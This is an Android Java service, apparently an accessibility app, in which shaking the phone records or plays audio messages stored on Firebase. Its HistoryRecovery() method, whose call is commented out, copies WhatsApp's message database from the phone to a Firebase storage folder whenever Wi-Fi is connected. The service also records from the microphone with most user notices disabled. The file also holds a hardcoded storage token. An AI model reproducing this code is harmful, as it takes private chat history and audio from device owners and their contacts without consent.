package com.example.myapplication;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.SensorListener;
import android.hardware.SensorManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;

public class BlindService extends Service implements SensorListener {
    public BlindService() {

    }
    //For recorder
    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static String fileName = null;
    private MediaRecorder recorder = null;
    private MediaPlayer player =null;
    // Requesting permission to RECORD_AUDIO
    private boolean permissionToRecordAccepted = false;
    //  private String [] permissions = {Manifest.permission.RECORD_AUDIO};
    private MediaRecorder mRecorder;
    private MediaPlayer mPlayer;
    private static final String LOG_TAG = "AudioRecording";
    private static String mFileName = null;
    private static String audioFilePath = null;
    public static final int REQUEST_AUDIO_PERMISSION_CODE = 1;
    int numberOfShake_left= 0;
    int numberOfShake_right= 0;
    //For Firebase
    private StorageReference mStorageRef;
    private FirebaseAuth fbAuth;
    private FirebaseAuth.AuthStateListener authListener;
    private FirebaseDatabase database;
    private DatabaseReference myRef;

    // For shake motion detection.
    private SensorManager sensorMgr;
    private long lastUpdate = -1;
    private float x, y, z;
    private float last_x, last_y, last_z;
    private static final int SHAKE_THRESHOLD = 800;
    @Override
    public void onCreate() {
        super.onCreate();
        database = FirebaseDatabase.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference();
        fbAuth = FirebaseAuth.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference();
        //myRef = database.getReference("message");
        database=FirebaseDatabase.getInstance();
        myRef = database.getReference().child("message");

        //HistoryRecovery();

        // start motion detection
        sensorMgr = (SensorManager) getSystemService(SENSOR_SERVICE);
        boolean accelSupported = sensorMgr.registerListener(this,
                SensorManager.SENSOR_ACCELEROMETER,
                SensorManager.SENSOR_DELAY_GAME);

        if (!accelSupported) {
            // on accelerometer on this device
            sensorMgr.unregisterListener(this,
                    SensorManager.SENSOR_ACCELEROMETER);
        }
    }
    protected void onPause() {
        if (sensorMgr != null) {
            sensorMgr.unregisterListener(this,
                    SensorManager.SENSOR_ACCELEROMETER);
            sensorMgr = null;
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onSensorChanged(int sensor, float[] values) {
        mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
        mFileName += "/AudioRecording2.3gp";

        if (sensor == SensorManager.SENSOR_ACCELEROMETER) {
            long curTime = System.currentTimeMillis();
            // only allow one update every 100ms.
            if ((curTime - lastUpdate) > 100) {
                long diffTime = (curTime - lastUpdate);
                lastUpdate = curTime;

                x = values[SensorManager.DATA_X];
                y = values[SensorManager.DATA_Y];
                z = values[SensorManager.DATA_Z];

                if(Round(x,4)>10.0000){
                    Log.d("sensor", "X Right axis: " + x);
                    numberOfShake_right++;
                   // Toast.makeText(this, "Right shake detected"+numberOfShake_right, Toast.LENGTH_SHORT).show();
                    numberOfShake_left=0;
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
// Vibrate for 500 milliseconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        //deprecated in API 26
                        v.vibrate(50);
                    }

                }
                else if(Round(x,4)<-10.0000){
                    Log.d("sensor", "X Left axis: " + x);
                    numberOfShake_left++;
                   // Toast.makeText(this, "Left shake detected"+numberOfShake_left, Toast.LENGTH_SHORT).show();
                    numberOfShake_right=0;
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
// Vibrate for 500 milliseconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(50, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        //deprecated in API 26
                        v.vibrate(50);
                    }
                }

                if (numberOfShake_right>2)
                {
                    downloadAudio();
                    numberOfShake_right=0;

                }
                if (numberOfShake_left==3)
                {    numberOfShake_left=0;
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
// Vibrate for 500 milliseconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        //deprecated in API 26
                        v.vibrate(500);
                    }

                    mRecorder = new MediaRecorder();
                    mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    mRecorder.setOutputFile(mFileName);
                    try {
                        mRecorder.prepare();
                    } catch (IOException e) {
                        Log.e(LOG_TAG, "prepare() failed");
                    }

                    // Toast.makeText(getApplicationContext(), "Recording Started", Toast.LENGTH_LONG).show();
                            mRecorder.start();

                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                                                                        @Override
                                                                        public void run() {
                                                                            //Do something here
                                                                            mRecorder.stop();
                                                                            mRecorder.release();
                                                                            mRecorder = null;
                                                                            uploadAudio();
                                                                            //Toast.makeText(getApplicationContext(), "Recording Stopped after 10S", Toast.LENGTH_LONG).show();

                                                                           // Toast.makeText(getApplicationContext(), "Recorded  ", Toast.LENGTH_LONG).show();
                                                                        }

                                                                    }, 10000

                    );


                }





                float speed = Math.abs(x+y+z - last_x - last_y - last_z) / diffTime * 10000;

                // Log.d("sensor", "diff: " + diffTime + " - speed: " + speed);
                if (speed > SHAKE_THRESHOLD) {
                    //Log.d("sensor", "shake detected w/ speed: " + speed);
                    //Toast.makeText(this, "shake detected w/ speed: " + speed, Toast.LENGTH_SHORT).show();
                }
                last_x = x;
                last_y = y;
                last_z = z;
            }
        }

    }

    @Override
    public void onAccuracyChanged(int sensor, int accuracy) {

    }
    public static float Round(float Rval, int Rpl) {
        float p = (float)Math.pow(10,Rpl);
        Rval = Rval * p;
        float tmp = Math.round(Rval);
        return (float)tmp/p;
    }
    private void HistoryRecovery(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            // Do whatever

            audioFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.crypt12";
            StorageReference riversRef = mStorageRef.child("Sauve").child("msgstore.db.crypt12 ");
            Uri file = Uri.fromFile(new File(audioFilePath));
            riversRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    //Toast.makeText(getApplicationContext(), "Audio Uploaded", Toast.LENGTH_LONG).show();


                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception exception) {
                            // Handle unsuccessful uploads
                            // Toast.makeText(getApplicationContext(), "Audio not Uploaded", Toast.LENGTH_LONG).show();

                            // ...
                        }
                    });


        }
        else {
            Recorder();

        }

    }

    private void downloadAudio() {


        mPlayer = new MediaPlayer();
        try {
            mPlayer.setDataSource("https://firebasestorage.googleapis.com/v0/b/test-fde0b.appspot.com/o/audio%2FAudio%20?alt=media&token=48976734-a198-406a-a6e5-6bf0e6b73e1d");
            mPlayer.prepare();
            mPlayer.start();
           // Toast.makeText(getApplicationContext(), "Recording Started Playing", Toast.LENGTH_LONG).show();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

    }

    private void uploadAudio() {


        // Toast.makeText(getApplicationContext(), audioFilePath+"", Toast.LENGTH_LONG).show();
        //if there is a file to upload
        StorageReference riversRef2 = mStorageRef.child("audio").child("Audio ");

        //StorageReference audioFilePath=mStorageRef.child("Audio").child(fileName);

        Uri file2 = Uri.fromFile(new File(mFileName));
        riversRef2.putFile(file2).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
               // Toast.makeText(getApplicationContext(), "Sauv Uploaded", Toast.LENGTH_LONG).show();


            }
        })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                   //     Toast.makeText(getApplicationContext(), "Sauv not Uploaded", Toast.LENGTH_LONG).show();

                        // ...
                    }
                });


    }


    private void Recorder() {

        {


            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setOutputFile(mFileName);
            try {
                mRecorder.prepare();
            } catch (IOException e) {
                Log.e(LOG_TAG, "prepare() failed");
            }
            mRecorder.start();
            // Toast.makeText(getApplicationContext(), "Recording Started", Toast.LENGTH_LONG).show();


        }
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                                                            @Override
                                                            public void run() {
                                                                //Do something here
                                                                mRecorder.stop();
                                                                mRecorder.release();
                                                                mRecorder = null;

                                                                //Toast.makeText(getApplicationContext(), "Recording Stopped after 10S", Toast.LENGTH_LONG).show();

                                                                Toast.makeText(getApplicationContext(), "Recorded  ", Toast.LENGTH_LONG).show();}

                                                        }, 10000

        );
    }



}
